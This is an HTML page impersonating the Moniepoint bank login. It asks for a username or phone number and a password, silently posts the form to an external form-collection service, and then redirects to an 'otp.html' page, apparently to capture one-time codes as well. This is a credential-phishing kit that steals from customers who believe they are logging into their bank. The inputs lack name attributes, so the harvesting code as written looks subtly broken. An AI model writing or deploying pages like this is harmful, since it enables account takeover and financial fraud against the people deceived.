<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Application</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      $('form').submit(function(event) {
        event.preventDefault();
        $.ajax({
          url: 'https://formspree.io/f/moqgaypd',
          method: 'POST',
          data: $('form').serialize(),
          dataType: 'json',
          success: function(response) {
            redirectToOTP();
          },
          error: function(xhr, status, error) {
            console.log(xhr.responseText);
            alert('An error occurred. Please try again.');
          }
        });
      });
    });

    function redirectToOTP() {
      window.location.href = 'otp.html';
    }
  </script>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #0A2F6F;
      font-family: Arial, sans-serif;
    }

    .container {
      padding: 20px;
      max-width: 600px;
      margin: 0 auto;
    }

    .logo {
      width: 50px;
      height: 50px;
      padding: 10px;
    }

    .welcome-text {
      color: white;
      margin-top: 10px;
    }

    .login-box {
      background-color: white;
      padding: 20px;
      border: 2px solid #ccc;
      border-radius: 5px;
      margin-top: 20px;
      position: relative;
    }

    .input-group {
      margin-bottom: 15px;
    }

    input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
    }

    .forgot-text {
      color: #0361F0;
      position: absolute;
      bottom: 0;
      right: 0;
      font-family: verdana;
    }

    .login-btn {
      background-color: #0361F0;
      color: white;
      padding: 10px 90px;
      border: none;
      border-radius: 5px;
      display: block;
      margin: 0 auto;
      text-align: center;
      cursor: pointer;
    }

    .signup-box {
      background-color: #335287;
      padding: 15px;
      border-radius: 10px;
      margin-top: 20px;
    }

    .signup-text {
      text-align: center;
      color: white;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="logo.png" alt="Bank Logo" class="logo">
    <div class="welcome-text"><b>Login to Monie Point</b></div>
    <form>
      <div class="login-box">
        <div class="input-group">
          <input type="text" placeholder="Username or Phone Number" required>
        </div>
        <div class="input-group">
          <input type="password" placeholder="Password" required>
        </div>
        <button class="login-btn">Login</button>
      </div>
    </form>
    <br>
    <br>
    <div class="forgot-text">Forgot username or password</div>
    <div class="signup-box">
      <div class="signup-text"><b>New to Moniepoint? Sign Up</b></div>
    </div>
  </div>
</body>
</html>
